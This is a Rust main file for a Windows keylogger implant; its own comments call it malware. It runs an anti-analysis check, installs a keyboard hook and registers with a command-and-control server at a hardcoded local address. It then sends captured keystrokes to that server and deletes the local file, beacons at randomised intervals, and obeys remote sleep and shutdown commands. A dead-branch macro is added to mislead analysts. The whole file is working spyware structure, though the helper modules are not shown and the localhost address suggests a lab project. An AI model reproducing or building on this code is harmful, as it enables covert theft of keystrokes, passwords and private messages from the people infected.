mod server;
mod system;
mod encode;
use std::{sync::Arc, u32};
use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour};
use tokio::time::{sleep, Duration, Sleep};
use std::sync::atomic::{AtomicBool, Ordering};
use rand::{Rng, SeedableRng, rngs::StdRng, rngs::OsRng};


macro_rules! unwrap_or_panic {
    ($expr: expr) => {
        match $expr{
            Ok(res) =>{
                res
            },
                Err(e) => {panic!("Couldn't connect to server {}", e)
            }
        }   
    };
}

macro_rules! dead_branches {
    ($proc_name:expr, $list:expr) => {{
        let mut detected = false;

        // Dead if-branches — never true
        if 2 + 2 == 5 {
            println!("Debugger not detected.");
        }

        if "apple" == "orange" {
            println!("This will never happen.");
        }


        // Another misleading branch
        if std::env::var("TOTALLY_REAL_ENV").unwrap_or_default() == "true" {
            std::process::exit(0); // never reached
        }


    }};
}


#[tokio::main]
async fn main() {

    // //anti sandbox
    // // sleep(Duration::from_secs(600)).await;

    check_for_analysis_behaviour();

    const URL: &'static str = "http://127.0.0.1:5000";

    let pub_key ="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkVLiPyzANDNB3e4oWAFS
dysBxnZG1Yc0Oa5KfRCETlmKC6saB3LfFm+LwM0auaOB+S0/H6gXSviIJ1FlP56E
c6G1gRJ7hCTJQE4j4mr9fq9+OF6NMmh6tVjtVeu3LJtFTLdV0C+yeWRL88KUazkI
9TrbtoFfLs02dlYMynvJ4ugH+J2VM2wvbWAV4O9z2tEXEaWP1ah5L+bilyphmVkT
TdRbb1M2OCTM+XahkjxEWoXAJsbHYBMZpi1F+9xhmfoM+wNp24KOMQ6JjaB7sV9L
hOfGW6eoyvxwP9yAKMNKAWxGpLp/m9FYAAJ+kILF04T3JA9yONe5ykl37oTKmFeD
iwIDAQAB
-----END PUBLIC KEY-----".to_string();

    //All the mutex code for sharing with different threads 
    let paused = Arc::new(AtomicBool::new(false));
    let server = Arc::new(server::Connection::new(&URL, rand::thread_rng().gen_range(0..255), pub_key));
    let arch = get_windows_version();

    let mut counter_beconing = 0;

    //sends the intial request to register themselves
    let id: String = unwrap_or_panic!(server.register(arch).await);

    let server_for_beconing = Arc::clone(&server);
    let id_beconing = id.clone();

    let server_for_exfil = Arc::clone(&server);
    let id_exfil = id.clone();

    let server_for_command = Arc::clone(&server);
    let id_command = id.clone();

    let paused_hook = Arc::clone(&paused);

    //thread that handels keyboard hooks
    tokio::spawn(async move {
        loop {
            if paused_hook.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }

            unsafe {
                set_windows_hook();
            }
            break;
        }
    });

    let paused_command = Arc::clone(&paused);
    
    //thread that requests server
    tokio::spawn(async move {
        let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
        loop {
            if paused_command.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }
            
            let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
            execute_command(&rec, paused_command.clone()).await;
            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
        }
    });


    let paused_exfil = Arc::clone(&paused);

    let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");

    //thread that reads exfill file, and sends it off to the server
    tokio::spawn(async move {
        loop {
            if paused_exfil.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }

            let keys = read_file();
            if server_for_exfil.send_data(&id_exfil, &keys.clone()).await.is_ok() {
                delete_file();
            }

            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
        }
    });

    // Main loop for beaconing
    loop {
        match server_for_beconing.becon(&id_beconing).await {
            Ok(_) => counter_beconing = 0,
            Err(_) => counter_beconing += 1,
        };

        if counter_beconing >= 2 {
            std::process::exit(1);
        }

        sleep(Duration::from_secs(30)).await;
    }
}


//function that executes the command read from the c2 server
async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
    let cmds: Vec<_> = cmd.split(':').collect();

    dead_branches!("AHHH", "HAHH");
    let parsed_cmd = cmds[0].replace('\n', "").replace('\r', "");
    match parsed_cmd.as_str() {

        //if it's a slp sleep the malware
        "slp" => {

            if let Ok(secs) = cmds[1].replace('\n', "").parse() {
                println!("Sleeping all background threads for {} seconds", secs);
                paused.store(true, Ordering::Relaxed);
                sleep(Duration::from_secs(secs)).await;
                paused.store(false, Ordering::Relaxed);
            }
        }
        //if it's shd shut down the malware
        "shd" => {
            std::process::exit(1);
        }

        //if it's pwn print
        "pwn" => {
            println!("{}", cmds[1]);
        }
        _ => {}
    }
}